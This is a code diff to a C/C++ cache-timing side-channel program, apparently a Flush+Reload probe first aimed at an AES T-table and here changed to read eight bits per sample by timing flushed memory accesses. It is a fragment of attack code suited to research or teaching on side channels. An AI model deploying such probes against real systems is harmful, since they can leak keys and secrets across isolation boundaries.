@@ -17,7 +17,7 @@
 #include <sys/socket.h>
 #include <iomanip>
 
-#define MIN_CACHE_MISS_CYCLES (140)
+#define MIN_CACHE_MISS_CYCLES (400)
 #define MSG_FILE "msg.txt"
 #define MAX_MSG_SIZE 500
 char  BitArray[MAX_MSG_SIZE*8];
@@ -95,22 +95,22 @@ int main(int argc, char *argv[])
     debug_flag = true;
     for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i) {
          
-        while (reading[i][n] != '\0') { 
+        while (n<8) { 
         if (debug_flag)
             printf("Flusing the base address ... .. ...\n");
         flush(probe);
  
         if (debug_flag)
-            printf("Timing the probe of T0 table..\n");
+            printf("Timing the probe ..\n");
             
         size_t time = rdtsc();
         maccess(probe); 
         size_t delta = rdtsc() - time;
         
-        printf(" \n \n %lld cyccles of delta you know .. \n",delta);
+        printf(" \n \n %lld cyccles of delta .. \n",delta);
         if (delta > MIN_CACHE_MISS_CYCLES)
         {
-            reading[i][n] = '1';
+            reading[i][n] = '0';
         }
         else {
         	reading[i][n] = '1';
@@ -123,7 +123,13 @@ int main(int argc, char *argv[])
        // debug_flag = false;
     }
     printf("====================================================\n");
-    printf(" \n %s \n ",reading[1]);
+    
+    for (int j = 0; j< NUMBER_OF_ENCRYPTIONS;j++) {
+   
+    for (int i = 0; i< 8; i++) {
+    
+    printf(" %c  ",reading[j][i]);
+    } printf("\n \n");}
 
     close(fd);
     munmap(base, map_size);
